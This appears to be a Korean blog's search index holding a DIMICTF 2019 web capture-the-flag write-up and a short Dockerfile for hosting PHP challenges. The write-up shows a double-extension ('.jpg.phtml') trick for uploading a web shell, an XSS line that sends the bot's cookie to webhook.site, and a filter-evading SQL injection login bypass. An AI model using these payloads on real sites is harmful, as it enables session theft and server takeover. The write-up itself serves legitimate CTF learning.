<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DIMICTF 2019 Write up</title>
      <link href="2020/02/06/dimictf-200206/"/>
      <url>2020/02/06/dimictf-200206/</url>
      
        <content type="html"><![CDATA[<h3 id="1-web-5shared"><a href="#1-web-5shared" class="headerlink" title="1. web(5shared)"></a>1. web(5shared)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$session</span> = md5(session_id());</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="keyword">__DIR__</span> . <span class="string">&quot;/~uploads/<span class="subst">&#123;$session&#125;</span>/&quot;</span>;</span><br><span class="line"></span><br><span class="line">createDirectory(<span class="keyword">__DIR__</span> . <span class="string">&quot;/~uploads/&quot;</span>);</span><br><span class="line">createDirectory(<span class="variable">$uploaddir</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r($_FILES[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line"><span class="variable">$extension</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$extension</span>, <span class="keyword">Array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;png&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the real sanity check</span></span><br><span class="line"><span class="variable">$real_extension</span> = array_pop(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">4096</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;최대 4mb까지 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;성공적으로 파일이 업로드되었습니다.&#x27;); location.href = &#x27;/&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;업로드 에러&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$message</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sanity check</span></span><br><span class="line"><span class="variable">$extension</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$extension</span>, <span class="keyword">Array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;png&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the real sanity check</span></span><br><span class="line"><span class="variable">$real_extension</span> = array_pop(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다.</p><p>sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,<br>jpg, gif, png 만 허용시켜 둔 상황이다.</p><p>그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다.</p><ol><li>test.jpg</li><li>test.jpg.php<br>jpg 뒤에 확장자를 하나 더 붙여서 실행 파일로 만들어 주면 확장자 검사를 피할 수 있다.<br>근데 아래 real sanity check를 보면 php는 또 불가능 하기 때문에 php 대체 확장자를 써서 우회해주자. (phtml, php5 등)</li></ol><p>upload) test.jpg.phtml<br>위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다.</p><hr><h3 id="2-web-simple-xss"><a href="#2-web-simple-xss" class="headerlink" title="2. (web) simple xss"></a>2. (web) simple xss</h3><p>문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,<br>봇의 쿠키를 탈취하면 된다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">&#x27;https://webhook.site/~&#x27;</span>+document.cookie;</span><br></pre></td></tr></table></figure><hr><h3 id="3-web-simple-sqli"><a href="#3-web-simple-sqli" class="headerlink" title="3. (web) simple sqli"></a>3. (web) simple sqli</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//error_reporting(E_ALL); </span></span><br><span class="line"><span class="comment">//ini_set(&quot;display_errors&quot;, 1); </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;lib.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view-source&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line"><span class="variable">$pw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($conn); </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/information|admin|or|\=| |\#|\&#x27;|_|where/i&quot;</span>, <span class="variable">$id</span> . <span class="variable">$pw</span>)) </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$id</span>, <span class="variable">$pw</span>)) &#123; </span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `users` WHERE `id` = trim(&#x27;<span class="subst">&#123;$id&#125;</span>&#x27;) AND `pw` = trim(&#x27;<span class="subst">&#123;$pw&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysqli_fetch_array(mysqli_query(<span class="variable">$conn</span>, <span class="variable">$query</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;<span class="subst">&#123;$flag&#125;</span>&lt;/h1&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) &#123; </span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;<span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>님 안녕하세요!&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>페이지 로그인 코드는 다음과 같다.<br>$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다.</p><p>이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span>\<span class="operator">&amp;</span>pw<span class="operator">=</span>)<span class="operator">||</span> id <span class="keyword">like</span> &quot;ad&quot; &quot;min&quot;<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF, Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Web Challenge(Dockerfile)</title>
      <link href="2020/02/05/dockerfile-200205/"/>
      <url>2020/02/05/dockerfile-200205/</url>
      
        <content type="html"><![CDATA[<p>간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND=noninteractive</span><br><span class="line">ENV TERM=linux</span><br><span class="line"></span><br><span class="line">RUN apt-get update -y</span><br><span class="line">RUN apt-get install apache2 -y</span><br><span class="line">RUN apt-get install libapache2-mod-php -y</span><br><span class="line">RUN apt-get install php -y</span><br><span class="line">RUN apt-get install vim -y</span><br><span class="line"></span><br><span class="line">COPY ./files /var/www/html</span><br><span class="line">RUN rm -rf /var/www/html/index.html</span><br><span class="line">EXPOSE 포트번호</span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;/usr/sbin/apache2ctl&quot;</span>, <span class="string">&quot;-D&quot;</span>, <span class="string">&quot;FOREGROUND&quot;</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dockerfile, Docker </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
